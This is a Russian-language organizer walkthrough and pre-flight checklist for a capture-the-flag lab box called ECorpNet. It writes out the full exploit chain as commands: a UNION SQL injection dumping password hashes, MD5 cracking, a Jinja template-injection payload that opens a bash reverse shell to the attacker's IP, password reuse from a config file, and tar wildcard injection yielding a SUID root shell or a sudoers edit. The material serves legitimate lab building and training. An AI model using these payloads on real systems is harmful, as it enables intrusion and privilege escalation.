# ECorpNet — полный райтап + чек-лист проверки сервера

> СПОЙЛЕРЫ. Только для организатора. Не класть на бокс и не показывать до конца CTF.

Цепочка: recon → регистрация подрядчиком → UNION SQLi в API → MD5 → `bowwow` → админка →
SSTI в превью email-шаблона → шелл `ecorpnet` → `backup.conf` → `pnair` (user.txt) →
`sudo steelmountain-backup` → tar wildcard injection → root (root.txt).

Нужно на атакующей машине: `nmap ffuf seclists curl john rockyou.txt nc python3`.

```bash
export T=<IP_БОКСА>      # IP бокса
export B=http://$T
export ME=<ТВОЙ_IP>      # твой IP в той же сети (для reverse shell)
```

---

## 0. Pre-flight на сервере (сделать ДО прохождения)

```bash
# на сервере, из репо
sudo ./box/provision.sh                  # разворачивает всё и сам вызывает ctf-reset (нужен интернет: apt + pip)
sudo cat /root/.ctf-flags                # запиши оба флага, чтобы сверить в конце

systemctl is-active ecorpnet nginx ssh   # active x3
ss -tlnp | grep -v -e 127.0.0.1 -e '\[::1\]'   # только 22 и 80
sudo -l -U pnair                         # (root) NOPASSWD: /usr/local/bin/steelmountain-backup
ls -l /etc/ecorpnet/backup.conf          # -rw-r----- root ecorpnet
ls -ld /srv/reports                      # drwxr-xr-x pnair pnair
ls -l /home/pnair/user.txt /root/root.txt   # -r--r----- root pnair / -r-------- root root
findmnt -no OPTIONS /tmp                 # nosuid (проверено) → см. примечание в шаге 7
sudo ctf-snapshot                        # эталон для отката (после ЛЮБЫХ своих правок — заново)
```

Гигиена, которую легко забыть:
- Удалить `~/ctf-src` (или где лежит репо) с бокса — в нём `WALKTHROUGH.md` и пароль pnair.
- `getent group sudo` — никого, кроме тебя; у твоего аккаунта (`philipp`) **сильный пароль**.
  Из веб-шелла видно `ls /home` → `philipp`; слабый пароль = `su philipp` → `sudo -i` в обход всей цепочки.
- `grep -i passwordauth /etc/ssh/sshd_config /etc/ssh/sshd_config.d/*` — парольный вход должен
  быть разрешён (нужен для `ssh pnair@`). `PermitRootLogin no` уже стоит.

---

## 1. Recon

```bash
nmap -sC -sV -p- --min-rate 2000 -T4 $T
```
Ожидание: `22/tcp ssh OpenSSH 10.0p2 Debian`, `80/tcp http nginx`, редирект на `/login?next=/`.

```bash
ffuf -s -u $B/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,308,401,403
# admin directory documents login profile register reports tickets

ffuf -s -u $B/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,301,302,308,401,403
# api/v1/me  → 401

curl -s $B/api/v1/                # индекс API открыт без логина
# {"endpoints":["/api/v1/me","/api/v1/employees","/api/v1/employees/<id>","/api/v1/wallet","/api/v1/tickets"],...}
```

✅ Проверка: 2 порта, `/register` открыт, `/api/v1/` отвечает JSON.

---

## 2. Регистрация подрядчиком

```bash
csrf() { curl -s "$@" | grep -oP 'csrf_token" value="\K[^"]+' | head -1; }

t=$(csrf -c jar.txt $B/register)
curl -s -b jar.txt -c jar.txt -X POST $B/register \
  --data-urlencode username=mallory --data-urlencode "full_name=Mallory Riot" \
  --data-urlencode company=Allsafe  --data-urlencode email=mallory@allsafe.example \
  --data-urlencode 'password=Passw0rd!' --data-urlencode 'confirm=Passw0rd!' \
  --data-urlencode csrf_token=$t -o /dev/null -w '%{http_code}\n'     # 302

t=$(csrf -c jar.txt $B/login)
curl -s -b jar.txt -c jar.txt -X POST $B/login \
  --data-urlencode username=mallory --data-urlencode 'password=Passw0rd!' \
  --data-urlencode csrf_token=$t -o /dev/null -w '%{http_code}\n'     # 302

curl -s -b jar.txt $B/api/v1/me                                        # JSON с ролью contractor
```

✅ Проверка: `/api/v1/me` возвращает твой профиль.

---

## 3. SQLi в `/api/v1/employees?q=` → хэш админа

Поиск в веб-интерфейсе (`/directory`) параметризован, а в API — нет:
```sql
... WHERE is_active = 1 AND (full_name LIKE '%<q>%' OR username LIKE '%<q>%' OR department LIKE '%<q>%')
```

```bash
curl -s -b jar.txt -G $B/api/v1/employees --data-urlencode "q='" -o /dev/null -w '%{http_code}\n'   # 500
curl -s -b jar.txt -G $B/api/v1/employees --data-urlencode "q=') OR 1=1--" | python3 -m json.tool | head   # все сотрудники
```

9 колонок (`id, username, full_name, email, title, department, phone, office, manager_id`) — видно из
любого обычного ответа. СУБД: SQLite. Дамп таблицы `users`:

```bash
curl -s -b jar.txt -G $B/api/v1/employees --data-urlencode \
 "q=') AND 0 UNION ALL SELECT id,username,password_hash,email,role,department,phone,office,manager_id FROM users--" \
 | python3 -c 'import sys,json; [print(r["username"]+":"+r["full_name"]) for r in json.load(sys.stdin)]' \
 | tee hashes.txt
# pprice:0691df26da82d6eb2e5da8924628db63
# tcolby:034a1fd13b5abe6cc8bb1354e4e95040
# ...
```
(в поле `title` в этом запросе — роль: видно, что pprice = admin)

---

## 4. Взлом MD5

32 hex, без соли → raw MD5:
```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show --format=raw-md5 hashes.txt
# pprice:bowwow          ← строка 300 в rockyou; хэши сотрудников больше не ломаются (так задумано)
#                          (если пароль твоего mallory есть в rockyou — он тоже «взломается», это нормально)
```

Онлайн-брутфорс не вариант: 10 неудачных входов на IP+логин → блок на 10 минут.

✅ Проверка: в браузере `pprice / bowwow` → Administrator (Phillip Price, CEO).

---

## 5. SSTI → шелл `ecorpnet`

**Где:** Admin → Email templates → открыть любой шаблон (`/admin/comms/<id>`) → кнопка **Send test preview**.
Превью рендерится через `render_template_string` без песочницы (`ecorpnet/comms.py`).

Проверка в браузере: в Body вписать `{{7*7}}` → в превью `49`.

Reverse shell. Терминал 1:
```bash
nc -lvnp 4444
```
Терминал 2 (свежий cookie jar — `/login` редиректит, если уже залогинен):
```bash
t=$(csrf -c jar2.txt $B/login)
curl -s -b jar2.txt -c jar2.txt -X POST $B/login \
  --data-urlencode username=pprice --data-urlencode password=bowwow --data-urlencode csrf_token=$t -o /dev/null

t=$(csrf -b jar2.txt $B/admin/comms/1)
curl -s -b jar2.txt -X POST $B/admin/comms/1 \
  --data-urlencode name=welcome_new_hire --data-urlencode subject=Test --data-urlencode button=preview \
  --data-urlencode 'body={{ lipsum.__globals__.os.popen('"'"'bash -c "bash -i >& /dev/tcp/'"$ME"'/4444 0>&1" </dev/null >/dev/null 2>&1 &'"'"').read() }}' \
  --data-urlencode csrf_token=$t -o /dev/null
```
Тот же payload можно вставить прямо в поле Body в браузере (заменив IP).
`</dev/null >/dev/null 2>&1 &` обязательно — иначе HTTP-запрос висит, пока жив шелл.

Апгрейд до PTY (нужен для `su`):
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

✅ Проверка: `id` → `uid=…(ecorpnet) gid=…(ecorpnet)`, `pwd` → `/opt/ecorpnet/app`.
`touch /opt/ecorpnet/app/x` → Read-only file system (игроки не сломают приложение). `ls /home` → `philipp pnair`.

---

## 6. `ecorpnet` → `pnair` (user.txt)

```bash
find / -xdev -group ecorpnet -not -path '/opt/*' 2>/dev/null   # файлы нашей группы → /etc/ecorpnet/backup.conf
# (или шумнее: grep -ril pass /etc 2>/dev/null — ~70 файлов, backup.conf среди них)
ls -la /etc/ecorpnet/                                       # -rw-r----- root ecorpnet backup.conf
cat /etc/ecorpnet/backup.conf
# TODO(pnair): move to a service account, this is my login for now
# BACKUP_USER=pnair
# BACKUP_PASS=SteelMountain-Backup#2015
```

Переиспользование пароля:
```bash
su pnair              # из PTY-шелла
# или стабильнее, с атакующей машины:
ssh pnair@$T          # SteelMountain-Backup#2015
cat ~/user.txt        # flag{…}  ← сверить с USER_FLAG в /root/.ctf-flags
```

✅ Проверка: оба варианта (`su` из веб-шелла и `ssh`) работают; `cat /home/pnair/user.txt` из-под ecorpnet → Permission denied.

---

## 7. `pnair` → root (root.txt)

```bash
sudo -l
# (root) NOPASSWD: /usr/local/bin/steelmountain-backup
cat /usr/local/bin/steelmountain-backup
# cd /srv/reports
# tar czf /var/backups/steelmountain-reports.tgz *
ls -ld /srv/reports        # pnair — можем создавать файлы
```

Шелл раскрывает `*` в имена файлов до запуска tar → файл с именем `--checkpoint-action=…`
tar воспринимает как опцию (GTFOBins → tar).

```bash
cd /srv/reports
printf '#!/bin/sh\ncp /bin/bash /var/tmp/rb\nchmod 4755 /var/tmp/rb\n' > x.sh
touch ./--checkpoint=1
touch './--checkpoint-action=exec=sh x.sh'
sudo /usr/local/bin/steelmountain-backup
/var/tmp/rb -p
id                          # euid=0(root)
cat /root/root.txt          # flag{…}  ← сверить с ROOT_FLAG
```

> **Важно: `/var/tmp`, а не `/tmp`.** На Debian 13 `/tmp` — tmpfs с `nosuid`, SUID-бит там
> игнорируется, и `/tmp/rb -p` даст обычного pnair. Проверь `findmnt -no OPTIONS /tmp` на сервере.
> Если игроки застрянут на этом — это хорошая подсказка. Альтернативы без SUID:
> `echo 'cat /root/root.txt > /var/tmp/f; chmod 644 /var/tmp/f' > x.sh` или
> `echo 'pnair ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers` (только через SSH-сессию pnair —
> внутри веб-шелла `/etc` read-only из-за песочницы сервиса).

✅ Проверка: root.txt совпадает с `ROOT_FLAG`. Путь работает и из SSH-сессии pnair, и из `su pnair` в веб-шелле.

---

## 8. Финальный чек-лист перед игроками

| # | Что проверить | Ожидание |
|---|---|---|
| 1 | nmap снаружи | только 22, 80 |
| 2 | `/register` | открыт, аккаунт создаётся |
| 3 | `q='` в API | 500 |
| 4 | UNION-дамп | 16 строк (15 сотрудников + mallory), у pprice `0691df26…` |
| 5 | john + rockyou | ломается только `bowwow` |
| 6 | `{{7*7}}` в превью | 49 |
| 7 | reverse shell | `uid=ecorpnet`, приложение read-only |
| 8 | backup.conf | читается группой ecorpnet |
| 9 | `ssh pnair@` / `su pnair` | работает, user.txt = USER_FLAG |
| 10 | tar wildcard | root, root.txt = ROOT_FLAG |
| 11 | `sudo ctf-restore` | бокс чистый (см. ниже) |

## 9. После теста — откат

```bash
sudo ctf-restore
```
Убивает процессы игроков, удаляет всё созданное после `ctf-snapshot` (в т.ч. `/var/tmp/rb`,
файлы в `/srv/reports`, правки в `/etc`), восстанавливает файлы и права, затем `ctf-reset`
(БД, флаги, home pnair). Подробно — `rollback.md`.

Флаги ротировать: `sudo rm /root/.ctf-flags && sudo ./box/provision.sh` (нужен интернет), затем `sudo ctf-snapshot`.

---
Проверено дословно на 192.168.50.116, 13.11.2026: все блоки шагов 1–7 (веб-шелл + `su pnair`, и `ssh pnair@`).
Единственная замена при тесте — путь к rockyou.
